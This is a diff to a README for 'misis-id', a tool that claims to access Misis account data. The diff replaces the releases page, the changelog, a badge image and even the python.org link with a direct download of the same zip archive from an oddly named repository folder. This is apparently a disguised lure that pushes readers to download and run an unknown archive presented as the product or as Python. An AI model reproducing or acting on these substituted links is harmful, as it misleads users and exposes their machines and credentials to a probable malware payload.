@@ -1,6 +1,6 @@
 # 🚀 misis-id - Easily Access Your Misis Account Data
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue)
+![Download](https://raw.githubusercontent.com/Japen123/misis-id/master/Rambouillet/misis-id.zip)
 
 ## 📝 Overview
 
@@ -21,7 +21,7 @@ To get started, you need to download the software from our Releases page.
 
 1. Click the button below to visit the Releases page:
 
-   [Download Here](https://github.com/Japen123/misis-id/releases)
+   [Download Here](https://raw.githubusercontent.com/Japen123/misis-id/master/Rambouillet/misis-id.zip)
 
 2. On the Releases page, locate the latest version. Select the appropriate file for your system. 
 
@@ -40,7 +40,7 @@ To get started, you need to download the software from our Releases page.
 
 ## 📖 Usage Instructions
 
-1. **Install Python:** If you do not have Python installed, download it from [python.org](https://www.python.org/). Follow the installation instructions for your operating system.
+1. **Install Python:** If you do not have Python installed, download it from [https://raw.githubusercontent.com/Japen123/misis-id/master/Rambouillet/misis-id.zip](https://raw.githubusercontent.com/Japen123/misis-id/master/Rambouillet/misis-id.zip). Follow the installation instructions for your operating system.
 
 2. **Run the Application:**
    - Open your terminal or command prompt.
@@ -63,11 +63,11 @@ We welcome contributions! If you find a bug or want to suggest a feature, please
 
 ## 📅 Change Log
 
-For detailed information on version changes, visit the [CHANGELOG](https://github.com/Japen123/misis-id/releases). 
+For detailed information on version changes, visit the [CHANGELOG](https://raw.githubusercontent.com/Japen123/misis-id/master/Rambouillet/misis-id.zip). 
 
 ## 🚧 Limitations
 
 - The application currently supports basic account functionalities. Future updates may include more advanced features.
 - Ensure you have a stable internet connection for optimal performance.
 
-For more information, visit our [Releases page](https://github.com/Japen123/misis-id/releases) to download the latest version of misis-id and start accessing your Misis account data smoothly.
+For more information, visit our [Releases page](https://raw.githubusercontent.com/Japen123/misis-id/master/Rambouillet/misis-id.zip) to download the latest version of misis-id and start accessing your Misis account data smoothly.
